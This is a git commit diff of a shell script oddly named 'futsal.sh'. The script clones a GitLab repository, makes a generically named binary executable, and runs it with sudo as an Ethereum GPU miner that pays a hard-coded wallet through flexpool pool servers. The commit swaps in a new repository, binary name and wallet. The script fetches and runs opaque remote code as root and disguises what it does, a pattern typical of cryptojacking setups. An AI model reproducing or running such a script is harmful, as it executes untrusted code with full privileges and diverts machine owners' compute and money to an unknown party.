41e6564d1bf015685c4884373c5b20a7f264e70c
bajol1 <102598068+bajol1@users.noreply.github.com>
2022-04-13 23:32:55 +0700

    Update futsal.sh

--- futsal.sh
+++ futsal.sh
@@ -2,8 +2,8 @@
 sudo apt update
 sudo apt-get install zip unzip
 sudo apt install screen -y
-screen -dmS er.sh 65 75
-sudo git clone https://gitlab.com/letricejuliocesar/goodday
-cd goodday
-chmod +x x
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a ethash -w 0xd7DcbA930f7E556f712B5a73b31F10112D78256d -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io:4444 -r $ip --nvidia 1
+screen -dmS sahuman.sh 65 75
+sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
+cd sainame127
+chmod +x itsme
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0x3da2c7743970908cac0e6b606f064330aea8b03f  -p stratum+tcp://eth-hk.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
